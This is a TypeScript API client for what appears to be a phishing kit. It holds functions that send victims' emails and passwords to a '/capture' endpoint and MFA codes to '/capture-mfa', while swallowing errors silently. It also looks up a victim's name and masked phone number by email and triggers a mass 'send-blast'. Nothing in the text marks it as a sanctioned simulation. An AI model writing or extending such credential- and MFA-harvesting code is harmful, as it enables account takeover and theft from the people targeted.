const API_BASE = 'http://localhost:3001/api';

export async function trackEvent(event: string) {
  try {
    await fetch(`${API_BASE}/track`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ event }),
    });
  } catch {
    // Silently fail
  }
}

export async function captureCredentials(email: string, password: string) {
  try {
    await fetch(`${API_BASE}/capture`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password }),
    });
  } catch {
    // Silently fail
  }
}

export async function captureMfaCode(email: string, code: string) {
  try {
    await fetch(`${API_BASE}/capture-mfa`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, code }),
    });
  } catch {
    // Silently fail
  }
}

// Look up victim by email — returns their masked phone number
export async function lookupVictim(email: string): Promise<{ found: boolean; maskedPhone: string; name: string }> {
  try {
    const res = await fetch(`${API_BASE}/lookup`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email }),
    });
    return await res.json();
  } catch {
    return { found: false, maskedPhone: '+X XXXXXXXX53', name: '' };
  }
}

export async function getAnalytics() {
  const res = await fetch(`${API_BASE}/analytics`);
  return res.json();
}

export async function resetData() {
  await fetch(`${API_BASE}/reset`, { method: 'POST' });
}

export async function sendBlast() {
  const res = await fetch(`${API_BASE}/send-blast`, { method: 'POST' });
  return res.json();
}

export async function refreshSheet() {
  const res = await fetch(`${API_BASE}/refresh-sheet`, { method: 'POST' });
  return res.json();
}
